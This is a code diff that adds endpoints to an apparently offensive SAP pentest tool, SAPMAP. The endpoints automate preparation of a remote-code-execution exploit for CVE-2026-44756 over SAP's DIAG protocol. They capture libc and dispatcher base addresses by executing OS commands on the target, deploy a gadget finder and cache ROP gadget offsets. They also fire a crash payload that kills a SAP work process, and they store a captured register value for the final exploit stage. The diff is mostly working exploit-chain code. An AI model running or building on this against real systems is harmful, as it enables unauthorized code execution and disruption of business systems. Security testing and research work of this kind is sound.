@@ -8461,6 +8461,155 @@ def create_app(api: SAPMAPApi) -> Bottle:
              "CVE-2026-44756 base capture", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/exploit_cve_2026_44756_prepare_rce",
+                method="POST")
+    def node_exploit_cve_2026_44756_prepare_rce(sid):
+        """One-click recon that chains the three prep steps for the
+        DIAG RCE:
+            1. auto_capture_bases  — dw_base + libc_base via OS-exec
+            2. auto_capture_gadgets — per-target stage1/stage2/system
+            3. trigger_diag_crash_probe — fires bug_c_low32 over DIAG
+               so find_rdx.py on the target catches the SIGSEGV and
+               prints rdx.
+        Runs the three steps sequentially in one background thread so
+        the operator sees a linear progress log and the frontend can
+        prompt for the FIND_RDX_OK paste once step 3 has landed.
+        Destructive on step 3 (one WP crashes, sapstartsrv respawns
+        it) — requires confirm=true."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        if not data.get("confirm"):
+            return json.dumps({"error":
+                "confirm=true required — step 3 crashes one SAP work "
+                "process on the target.  Do NOT run on production."})
+
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        diag_port = int(data.get("diag_port") or 0)
+        if diag_port <= 0:
+            for inst in getattr(node, "instances", []) or []:
+                ports = getattr(inst, "ports", {}) or {}
+                for p, lbl in ports.items():
+                    try:
+                        p_int = int(p)
+                    except (TypeError, ValueError):
+                        continue
+                    if lbl == "dispatcher" or 3200 <= p_int <= 3299:
+                        diag_port = p_int
+                        break
+                if diag_port > 0:
+                    break
+            if diag_port <= 0:
+                diag_port = 3200
+
+        def _run():
+            from sap_cve_2026_44756_diag import (
+                auto_capture_bases, auto_capture_gadgets,
+                trigger_diag_crash_probe, CRASH_RIP)
+
+            print(f"[*] {sid}: Prepare RCE step 1/3 — capturing bases "
+                  f"via OS-exec ...")
+            cap = auto_capture_bases(node)
+            if cap.get("ok"):
+                node.cve_2026_44756_dw_base   = f"{cap['dw_base']:#x}"
+                node.cve_2026_44756_libc_base = f"{cap['libc_base']:#x}"
+                print(f"[+] {sid}: bases cached — dw={cap['dw_base']:#x} "
+                      f"libc={cap['libc_base']:#x} "
+                      f"wp_pid={cap.get('wp_pid')}")
+            else:
+                print(f"[-] {sid}: bases capture failed: "
+                      f"{cap.get('error')} — aborting Prepare RCE")
+                return
+
+            print(f"[*] {sid}: Prepare RCE step 2/3 — deploying "
+                  f"find_gadgets.py via OS-exec ...")
+            r = auto_capture_gadgets(node)
+            if r.get("ok"):
+                node.cve_2026_44756_stage1_dw_off   = f"{r['stage1_dw_off']:#x}"
+                node.cve_2026_44756_stage2_libc_off = f"{r['stage2_libc_off']:#x}"
+                node.cve_2026_44756_system_libc_off = f"{r['system_libc_off']:#x}"
+                node.cve_2026_44756_stage2_disp_rdi = f"{r['stage2_disp_rdi']:#x}"
+                node.cve_2026_44756_stage2_b_off    = f"{r['stage2_b_off']:#x}"
+                print(f"[+] {sid}: gadgets cached — "
+                      f"stage1_dw={r['stage1_dw_off']:#x} "
+                      f"stage2_libc={r['stage2_libc_off']:#x} "
+                      f"system_libc={r['system_libc_off']:#x}")
+            else:
+                print(f"[-] {sid}: gadget capture failed: "
+                      f"{r.get('error')} — aborting Prepare RCE")
+                return
+
+            print(f"[!] {sid}: Prepare RCE step 3/3 — firing DIAG "
+                  f"bug_c crash probe at {node.ip}:{diag_port} "
+                  f"(saved RIP = {CRASH_RIP:#x}). BEFORE this line "
+                  f"landed, find_rdx.py {sid.upper()} must have been "
+                  f"running on the target — if it was, it will now "
+                  f"print FIND_RDX_OK:pid=… rdx=0x… — paste that line "
+                  f"in the SAPMAP prompt to cache rdx.")
+            res = trigger_diag_crash_probe(node.ip, diag_port)
+            print(f"[*] {sid}: wire delivered={res['delivered']} "
+                  f"dropped={res['connection_dropped']} "
+                  f"resp_bytes={res['response_bytes']} "
+                  f"payload_bytes={res['passport_len']}")
+            if res["delivered"] and res["connection_dropped"] \
+                    and not res["response_bytes"]:
+                node.cve_2026_44756_dos_confirmed = True
+                node.cve_2026_44756_vulnerable = True
+                if node.cve_2026_44756_evidence != "diag_rce_signature":
+                    node.cve_2026_44756_evidence = "diag_crash_confirmed"
+                print(f"[!!] {sid}: DIAG crash CONFIRMED — check "
+                      f"find_rdx.py output on the target for the "
+                      f"FIND_RDX_OK line, then paste it in the SAPMAP "
+                      f"prompt.")
+            else:
+                print(f"[?] {sid}: DIAG crash did NOT match the "
+                      f"expected signature — see reasons above for the "
+                      f"crash-probe endpoint.")
+
+        _bg(f"{sid}:prepare_rce_cve_44756",
+             "CVE-2026-44756 Prepare RCE (bases+gadgets+crash)", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/cve_2026_44756_cache_rdx",
+                method="POST")
+    def node_cve_2026_44756_cache_rdx(sid):
+        """Persist an rdx value the operator captured with find_rdx.py
+        so the DIAG RCE handler can use it without re-prompting.
+        Accepts either a raw hex address (0x7f5608836f0d) or the full
+        FIND_RDX_OK line find_rdx.py emits, and picks out the rdx=…
+        token."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        raw = (data.get("rdx_hex") or data.get("rdx") or "").strip()
+        if not raw:
+            return json.dumps({"error": "rdx_hex is required"})
+
+        # Accept the whole "FIND_RDX_OK:pid=… rdx=0x… rip=… sig=…" line.
+        for tok in raw.replace(",", " ").split():
+            if tok.lower().startswith("rdx="):
+                raw = tok.split("=", 1)[1]
+                break
+
+        s = raw.lower()
+        if s.startswith("0x"):
+            s = s[2:]
+        try:
+            val = int(s, 16)
+        except ValueError:
+            return json.dumps({"error":
+                f"could not parse rdx={raw!r} as hex — expected format "
+                f"like '0x7f5608836f0d' or the full FIND_RDX_OK line"})
+
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        node.cve_2026_44756_session_rdx = f"{val:#x}"
+        print(f"[+] {sid}: rdx cached — {val:#x}")
+        return json.dumps({"status": "ok",
+                            "rdx_hex": f"{val:#x}"})
+
     @app.route("/api/node/<sid>/check_cve_2026_58240", method="POST")
     def node_check_cve_2026_58240(sid):
         """Probe MS internal port for the ASCS_GW opcode family
